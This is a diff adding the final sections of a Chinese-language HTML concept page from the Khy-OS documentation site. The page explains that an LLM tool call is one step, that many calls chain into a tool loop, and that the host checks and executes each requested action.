+<h2 id="十-工具调用-只调用一次">十、工具调用 ≠ 只调用一次<a class="anchor" href="#十-工具调用-只调用一次" aria-label="锚点">#</a></h2>
+<p>单独强调一遍，因为这是通向下一篇的桥。</p>
+<p>一次工具调用只是<strong>一步</strong>。真实任务往往需要<strong>很多次</strong>工具调用接力完成：读一个文件、再读一个、改一处、跑一次测试、看报错、再改一处……</p>
+<pre class="mermaid">flowchart LR
+  S[&quot;🎯 目标：修复 bug&quot;] --&gt; T1[&quot;🔧 读 A.js&quot;]
+  T1 --&gt; T2[&quot;🔧 读 B.js&quot;]
+  T2 --&gt; T3[&quot;🔧 改 B.js&quot;]
+  T3 --&gt; T4[&quot;🔧 跑测试&quot;]
+  T4 --&gt; T5{&quot;✅ 通过？&quot;}
+  T5 -- &quot;否&quot; --&gt; T3
+  T5 -- &quot;是&quot; --&gt; DONE[&quot;🎉 完成&quot;]</pre>
+<p>&quot;把很多次工具调用<strong>自动接力</strong>起来，直到目标完成&quot;——这就引出了下一个概念 <strong>Tool Loop（工具循环）</strong>。</p>
+<hr>
+<h2 id="十一-和-khy-os-的关系">十一、和 Khy-OS 的关系<a class="anchor" href="#十一-和-khy-os-的关系" aria-label="锚点">#</a></h2>
+<p>Khy-OS 内置了一批工具：读文件、写文件、跑命令、搜索代码、抓网页等等。大模型每做一步，就是发起一次工具调用，由 Khy-OS 的执行层安全地完成。</p>
+<p>在 Khy-OS 里，你能亲身体会到本文讲的每一点：</p>
+<ul><li><strong>三段式</strong>：亮菜单（内置工具清单）→ 模型下单 → 结果回灌，一次不落；</li><li><strong>安检那一步</strong>：Khy-OS 在真正执行前，会对危险命令（如&quot;下载即执行&quot;）做安全判断，这正是它安全设计的核心之一；</li><li><strong>模型碰不到执行权</strong>：所有真正的动作都由 Khy-OS 的执行层完成，模型只提交请求。</li></ul>
+<p>你后面会在设计文档里看到这些工具的真实定义，以及安全护栏是怎么落地的（参见 <a href="../03_DESIGN_设计"><code>docs/03_DESIGN_设计</code></a>）。</p>
+<hr>
+<h2 id="十二-小结-下一步">十二、小结 + 下一步<a class="anchor" href="#十二-小结-下一步" aria-label="锚点">#</a></h2>
+<ul><li>工具调用 = 大模型&quot;填申请单&quot;，执行程序&quot;替它动手&quot;，再把结果拿回来。</li><li>结构是三段式：<strong>工具清单（schema）→ 调用请求 → 工具结果</strong>；展开是<strong>五步</strong>：亮菜单 → 下单 → 安检 → 执行 → 回灌。</li><li>分工是铁律：<strong>模型决定，宿主执行</strong>（正因如此，才能在中间塞一道安检，这样才安全）。</li><li>五大常见误区：模型没有亲自执行、工具调用不只是联网、一次调用不等于搞定全任务、模型绕不过安检、结果要靠宿主回灌。</li><li>一次调用只是一步；把多步自动接力，就是工具循环。</li></ul>
+<p>👉 <a href="./[CONCEPT-03]%20什么是ToolLoop-工具循环.html">③ 什么是 Tool Loop（工具循环）</a></p>
+      </article>
+      <nav class="pager"><a class="prev" href="../../docs/02_CONCEPTS_概念入门/[CONCEPT-01] 什么是Agent-智能体.html"><div class="dir">← 上一篇</div><div class="ttl">① 什么是 Agent（智能体）</div></a><a class="next" href="../../docs/02_CONCEPTS_概念入门/[CONCEPT-03] 什么是ToolLoop-工具循环.html"><div class="dir">下一篇 →</div><div class="ttl">③ 什么是 Tool Loop（工具循环）</div></a></nav>
+      <div class="footer reveal">本页由 <code>scripts/docs/build_docs_site.js</code> 从对应的 <code>.md</code> 自动生成 · 离线可用 · Khy-OS 文档站</div>
+    </div>
+  </main>
+</div>
+<script>window.__KHY_ROOT__="../../";window.__KHY_CUR__="docs/02_CONCEPTS_概念入门/[CONCEPT-02] 什么是ToolCalling-工具调用.html";</script>
+<script src="../../docs/_assets/nav-data.js"></script>
+<script src="../../docs/_assets/mermaid.min.js"></script>
+<script src="../../docs/_assets/docs-site.js"></script>
+</body>
+</html>
